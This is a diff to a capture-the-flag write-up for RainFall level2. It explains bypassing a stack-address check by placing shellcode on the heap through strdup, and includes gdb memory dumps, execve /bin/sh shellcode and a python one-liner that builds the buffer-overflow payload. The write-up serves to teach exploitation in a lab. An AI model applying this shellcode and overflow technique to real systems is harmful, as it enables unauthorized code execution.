@@ -112,9 +112,9 @@ gdb-peda$
 
 The function we want to take a look at is the ones that have a vulnerability, and same as the level, the function `gets` is used. But, on the line from <+36> to <+49>, some comparison is happening.
 
-This basically restricts from using the technique used from last time (overwriting `eip` [XXX: right buffer?]), because if `eax` is in the range of stack, the `and` operation always will turn into `0xb0000000`, which will result jump into the `0x8048527`
+This restricts from using the technique used from last time (overwriting `eip`), because if `eax` is in the range of stack, the `and` operation always will turn into `0xb0000000`, which will result in an `exit` call.
 
-But what if the program instead jumps to the address to heap, instead of the stack? As the `strdup` function is called, the input will be copied to the heap, and if we can put an exploit on the heap somehow, we may be able to get it to execute.
+But what if the program instead jumps to the address to heap instead of the stack? As the `strdup` function is called, the input will be copied to the heap, and if we can put an exploit on the heap, we may be able to get it to execute.
 
 Let's take a look how it works.
 
@@ -175,6 +175,7 @@ gdb-peda$ x/30wx 0x804a008
 0x804a078:      0x00000000      0x00000000
 gdb-peda$
 ```
+
 The value is correctly copied, but the size of variable was 64, and it only copied 64 bytes.
 
 To check the address of heap, we can use `info proc mappings` command, and the beginning of the heap is shown below as `0x8048000`.
@@ -201,7 +202,7 @@ Mapped address spaces:
         0xbffdf000 0xc0000000    0x21000        0x0 [stack]
 ```
 
-Here we've found our copied memory in the heap.
+Here we've found our copied memory in the heap (starts 8 bytes after `0x804a000` at `0x804a008`).
 
 ```
 gdb-peda$ x/32wx 0x804a000
@@ -263,9 +264,7 @@ We know the address of the heap where the shellcode will be stored, `0x804a008` 
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 (28 bytes)
 ```
 
-XXX: how did we come up with 52 to put the offset?
-
-Let's try using our exploit:
+Let's try using our exploit (note that we assumed the offset of 80 like in level 1):
 
 ```
 level2@RainFall:~$ (python -c "print ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*52 + '\x08\xa0\x04\x08')" ; cat -) | ./level2
